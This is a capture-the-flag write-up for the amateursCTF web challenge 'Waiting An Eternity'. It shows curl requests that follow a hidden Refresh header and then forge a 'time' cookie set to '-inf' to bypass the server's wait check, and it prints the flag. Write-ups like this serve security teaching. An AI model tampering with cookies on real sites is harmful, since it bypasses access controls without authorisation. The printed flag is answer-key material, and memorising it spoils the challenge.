# Waiting An Eternity

## Description

By `voxal`

My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I've been waiting a couple days and it's still asking me to wait. I'm getting a little impatient, could you help me get the flag?

[waiting-an-eternity.amt.rs](https://waiting-an-eternity.amt.rs/)

## Solution

Visiting website gives us simple HTTP response. Let's try viewing headers.

```
➜ curl -sS -D - https://waiting-an-eternity.amt.rs/
HTTP/1.1 200 OK
Content-Length: 21
Content-Type: text/html; charset=utf-8
Date: Wed, 19 Jul 2023 20:21:54 GMT
Refresh: 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; url=/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a
Server: gunicorn

just wait an eternity
```

0w0 Interesting...

```bash
➜ curl -sS -D - https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a
HTTP/1.1 200 OK
Content-Length: 38
Content-Type: text/html; charset=utf-8
Date: Wed, 19 Jul 2023 20:22:26 GMT
Server: gunicorn
Set-Cookie: time=1689798146.8231204; Path=/

welcome. please wait another eternity.
```

Hmmm... We get a cookie `time`, is that how long we waited? What if we send cookie to be huge value? 

```bash
➜ curl -sS -D - https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a -b 'time=9999999999'
HTTP/1.1 200 OK
Content-Length: 80
Content-Type: text/html; charset=utf-8
Date: Wed, 19 Jul 2023 20:23:21 GMT
Server: gunicorn

you have not waited an eternity. you have only waited -8310201797.351136 seconds
```

Time is now negative, but we still need to wait an eternity... `time` cookie may be the start point of when we visit website. Something like `website_visit_time - n_seconds_elapsed = n_seconds_waited`.

If we send `inf` we get `you have only waited -inf seconds`, so what if we wait `-inf`?

```bash
➜ curl -sS -D - https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a -b 'time=-inf'
HTTP/1.1 200 OK
Content-Length: 59
Content-Type: text/html; charset=utf-8
Date: Wed, 19 Jul 2023 20:25:36 GMT
Server: gunicorn

amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}
```
::: tip Flag
`amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}`
:::